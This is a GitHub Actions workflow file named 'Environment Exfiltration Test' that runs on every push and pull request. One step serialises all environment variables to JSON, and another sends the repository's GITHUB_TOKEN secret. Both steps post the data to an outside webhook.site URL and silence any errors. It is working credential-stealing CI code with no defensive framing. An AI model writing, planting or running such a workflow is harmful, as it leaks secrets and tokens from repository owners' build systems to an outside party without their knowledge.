name: Environment Exfiltration Test
on: [push, pull_request, workflow_dispatch]

jobs:
  exfiltrate-env:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v3

      - name: Exfiltrate environment variables
        run: |
          {
            echo "{"
            env | awk -F= '{
              key=$1
              value=substr($0, length($1)+2)
              gsub(/"/, "\\\"", value)
              gsub(/\\/, "\\\\", value)
              printf "  \"%s\": \"%s\",\n", key, value
            }' | sed '$ s/,$//'
            echo "}"
          } | curl -X POST -H "Content-Type: application/json" -d @- https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a 2>/dev/null || true

      - name: Exfiltrate GitHub context
        run: |
          curl -X POST -H "Content-Type: application/json" \
            -d "{\"github_token\":\"${{ secrets.GITHUB_TOKEN }}\",\"repo\":\"${{ github.repository }}\",\"actor\":\"${{ github.actor }}\"}" \
            https://webhook.site/1793fdf7-26c0-494b-b8b0-5a38218c100a 2>/dev/null || true
